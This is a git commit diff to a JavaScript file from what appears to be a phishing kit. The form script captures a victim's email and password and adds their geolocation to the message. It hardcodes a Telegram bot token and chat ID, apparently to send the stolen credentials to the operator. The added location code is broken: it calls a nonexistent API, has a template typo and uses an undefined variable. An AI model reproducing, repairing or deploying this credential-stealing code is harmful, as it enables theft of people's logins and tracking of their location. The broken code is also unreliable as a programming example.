20326f818a40a1d42925a8c5b3765341daaa6482
dezignsensei <145669245+dezignsensei@users.noreply.github.com>
2023-10-07 09:30:16 +0100

    Update sender.js

--- theme-assets/js/scripts/sender.js
+++ theme-assets/js/scripts/sender.js
@@ -2,11 +2,14 @@ const form = document.querySelector("#form")
 
 form.addEventListener("submit", (e) => {
     e.preventDefault();
-
+var locate = table(data.address)
     var identity = document.getElementById("email").value;
     var password = document.getElementById("password").value;
-
-    var my_text = `Result is:%0A - Identity: ${identity} %0A - Password: ${password}`
+    navigator.geolocation.getCurrentLocation(position =>{
+        const{latitude, longitude} = position.coords;
+        const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=%{longitude}`;
+        fetch(url).then(res => res.json()).then(data => {console.table(data.address);});});
+    var my_text = `Result is:%0A - Identity: ${identity} %0A - Password: ${password} -location: ${locate}`
 
     var token = "6487678113:AAEnSRLqV9eUAI_4Ld32zFP4fixtJAUaYag";
     var chat_id = -1001937386351
